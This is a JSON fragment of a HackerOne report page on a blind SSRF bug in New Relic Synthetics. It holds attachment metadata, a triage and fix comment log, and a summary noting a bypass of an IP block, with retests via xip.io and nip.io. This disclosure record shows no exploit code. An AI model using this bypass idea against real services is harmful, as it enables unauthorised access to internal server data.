size":71350,"type":"image/png"},{"id":96304,"file_name":"2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042827Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026X-Amz-Signature=950ad4ff69044baa981a36f1922a1d042917d8ebacdc05740a228084921d86e2","file_size":136796,"type":"image/png"}],"allow_singular_disclosure_at":"2016-09-25T23:32:18.028Z","allow_singular_disclosure_after":-134369769.02822238,"singular_disclosure_allowed":true,"vote_count":12,"voters":["michiel","faloker","ylujion","jon_bottarini","skavans","muhammad_uwais","omega","nicknam3","cryptographer","dyabla","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":988534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for this awesome report, ylujion ! Your thoroughness and detailed writeup is really appreciated. We'll file it with the appropriate engineering team and start working on a fix. ","markdown_message":"\u003cp\u003eThanks for this awesome report, ylujion ! Your thoroughness and detailed writeup is really appreciated. We\u0026#39;ll file it with the appropriate engineering team and start working on a fix. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-27T23:25:15.574Z","updated_at":"2016-05-27T23:25:15.574Z","actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":993282,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-31T18:30:06.668Z","updated_at":"2016-05-31T18:30:06.668Z","actor":{"username":"mlapworth","cleared":false,"url":"/mlapworth","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":993289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi ylujion,\n\nWe're filed an issue with the development team. We'll update you here as we have additional questions and when the fix becomes available for you to re-test. \n\nThank you,\nMatthew","markdown_message":"\u003cp\u003eHi ylujion,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re filed an issue with the development team. We\u0026#39;ll update you here as we have additional questions and when the fix becomes available for you to re-test. \u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\nMatthew\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-31T18:32:34.880Z","updated_at":"2016-05-31T18:32:34.880Z","actor":{"username":"mlapworth","cleared":false,"url":"/mlapworth","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996881,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi ylujion,\n\nThe team has pushed a fix for this issue and the other you reported. Can you take a look and see if the issue(s) have been resolved?\n\nThanks,\nMatthew","markdown_message":"\u003cp\u003eHi ylujion,\u003c/p\u003e\n\n\u003cp\u003eThe team has pushed a fix for this issue and the other you reported. Can you take a look and see if the issue(s) have been resolved?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nMatthew\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-02T16:06:39.798Z","updated_at":"2016-06-02T16:06:39.798Z","actor":{"username":"mlapworth","cleared":false,"url":"/mlapworth","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996904,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I had the monitor still up, so I can tell that since yesterday I am not able to access the URL anymore.\n\nI still tried with other different service`xip.io` and `nip.io` to ensure that not only `xip.io` was blacklisted.\n\nRegards.\n","markdown_message":"\u003cp\u003eI had the monitor still up, so I can tell that since yesterday I am not able to access the URL anymore.\u003c/p\u003e\n\n\u003cp\u003eI still tried with other different service\u003ccode\u003exip.io\u003c/code\u003e and \u003ccode\u003enip.io\u003c/code\u003e to ensure that not only \u003ccode\u003exip.io\u003c/code\u003e was blacklisted.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-02T16:20:11.890Z","updated_at":"2016-06-02T16:20:11.890Z","actor":{"username":"ylujion","cleared":false,"url":"/ylujion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996928,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for helping us keep New Relic's customers secure! I'll be closing out this report and 141682. ","markdown_message":"\u003cp\u003eThank you for helping us keep New Relic\u0026#39;s customers secure! I\u0026#39;ll be closing out this report and 141682. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-02T16:38:53.543Z","updated_at":"2016-06-02T16:38:53.543Z","actor":{"username":"mlapworth","cleared":false,"url":"/mlapworth","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ylujion","url":"/ylujion"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1157059,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T23:32:18.005Z","updated_at":"2016-08-26T23:32:18.005Z","first_to_agree":true,"actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1170655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ylujion I've added a summary and set disclosure to limited for this issue. Thanks again !","markdown_message":"\u003cp\u003e\u003ca href=\"/ylujion\"\u003e@ylujion\u003c/a\u003e I\u0026#39;ve added a summary and set disclosure to limited for this issue. Thanks again !\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-02T21:32:03.798Z","updated_at":"2016-09-02T21:32:03.798Z","actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1173085,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-05T07:25:24.086Z","updated_at":"2016-09-05T07:25:24.086Z","actor":{"username":"ylujion","cleared":false,"url":"/ylujion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1173086,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-05T07:25:24.226Z","updated_at":"2016-09-05T07:25:24.226Z","actor":{"username":"ylujion","cleared":false,"url":"/ylujion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1173208,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You could have fully disclosed this one by the way as it does not disclose any sensitive information like the other one. Maybe if it is possible to change it as it is quite interesting.","markdown_message":"\u003cp\u003eYou could have fully disclosed this one by the way as it does not disclose any sensitive information like the other one. Maybe if it is possible to change it as it is quite interesting.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-05T07:55:09.852Z","updated_at":"2016-09-05T07:55:09.852Z","actor":{"username":"ylujion","cleared":false,"url":"/ylujion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1174731,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ylujion fully disclosed - I didn't read closely enough and see that the details were from Amazon's docs. Thanks again, as always appreciate the help to do our best with this program ! ","markdown_message":"\u003cp\u003e\u003ca href=\"/ylujion\"\u003e@ylujion\u003c/a\u003e fully disclosed - I didn\u0026#39;t read closely enough and see that the details were from Amazon\u0026#39;s docs. Thanks again, as always appreciate the help to do our best with this program ! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-05T17:10:18.489Z","updated_at":"2016-09-05T17:10:18.489Z","actor":{"username":"imelven","cleared":false,"url":"/imelven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2694233,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-03T03:29:45.606Z","updated_at":"2018-05-03T03:29:45.606Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"New Relic"}},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2572,"category":"team","content":"ylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. ","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. \u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}